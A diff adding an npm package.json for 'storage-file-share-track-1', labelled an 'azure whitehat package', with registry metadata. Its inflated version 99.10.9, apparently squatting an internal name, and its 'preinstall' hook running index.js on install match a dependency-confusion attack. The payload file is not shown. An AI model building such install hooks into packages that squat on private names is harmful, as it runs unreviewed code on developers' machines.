@@ -1,0 +1,39 @@
+{
+    "name": "storage-file-share-track-1",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "storage-file-share-track-1@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-0UlApY8Dl04uBBXKZURQb5lT1cObYQHQ8ZoWGNsx9Lg0PTJ67i1jC8HhWH5xpI9xBOCcmKY+nixN9a5RsrkoLA==",
+        "shasum": "a77b49f77a2dcee99dd5d65ffeebf555689980b8",
+        "tarball": "https://registry.npmjs.org/storage-file-share-track-1/-/storage-file-share-track-1-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3590,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhooHyCRA9TVsSAnZWagAABI4P/37LdRnES33T8zvUgHqg\nfb1ycXwU+B8rXIX5H5Rub8ms6w4TKZFxgKQl2hSbW85/eerAGRu6T7R/skM5\n7GQeryczcFY4hgPW3DoG5E3dnm4N3BK/opzgP/I0GsSqct1rxttvLkXtD3ul\nq8rlW3H20QfKKaNQ/I4zR7KY/S2tfbUP1C2BUQufzw5uEb/Enbs8+i0XqnX1\nod7v1IQV5cLYsysGX0A2VLpZEtcdWM1YZe0aNp0OtPJ/rfWdIeaZXfh83LyL\na6mJFzcBDzAQWHy7Y3ZnTemXM0XSKgpHgJDarK2oAFRsLlEFSqQCmIRp9fQj\nTmhRMMejhqs2sb1eC9LZPDPww8m8x5BUBMgzme42OpHBC6QqVPGB9ik5V3fQ\nhjLhsXoX6wohWfS5gwerI22hl2b8Ba73PMMbW/6x347p2eC4Z51ZGHylrgcb\nivSLxliNebCiFO6+nuT/TT5Ye9DWQ6/PdvggS70jgQKE9Dy2WLr4QCyK7m+s\nkDbUgyfR/8eAxaPWU2tDCwOX2ou12v4vZFOgnBQbAmjFjKkhTA0RlP8m3R52\n5l4Ha7nGSny8eawG6pVntsI+J9k055AtY4izPYINSNvQ1RsnSyHRGYLI+m7k\n4gIt7O13YgY9hZKKN6EPnB05UWsV5NWpXPH+p18kvf+wkTEmRAzat+1RXJyM\ni2j1\r\n=OYAu\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/storage-file-share-track-1_99.10.9_1638040050365_0.49262857326769227"
+    },
+    "_hasShrinkwrap": false
+}
